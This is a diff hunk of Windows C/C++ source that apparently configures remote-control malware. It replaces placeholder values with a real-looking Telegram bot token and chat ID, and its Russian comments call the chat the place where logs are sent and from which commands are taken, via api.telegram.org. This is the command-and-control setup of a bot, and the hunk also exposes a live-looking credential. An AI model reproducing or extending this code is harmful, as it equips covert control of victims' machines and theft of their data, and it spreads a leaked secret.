@@ -8,8 +8,8 @@
 #pragma comment(lib, "wininet.lib")
 
 // --- КОНФИГ ЦЕНТРА ---
-const char* BOT_TOKEN = "1234567890:AAHdqT..."; // Токен ТГ бота
-const char* CHAT_ID   = "123456789";            // ID чата куда слать логи и откуда принимать команды
+const char* BOT_TOKEN = "8508060217:AAH87XK6qzB8NNmfdm3DBiCCEQRv1QxxkP0"; // Токен ТГ бота
+const char* CHAT_ID   = "8944641597";            // ID чата куда слать логи и откуда принимать команды
 const char* BOT_API   = "api.telegram.org";
 
 // Функция для HTTP GET/POST запросов через WinINet
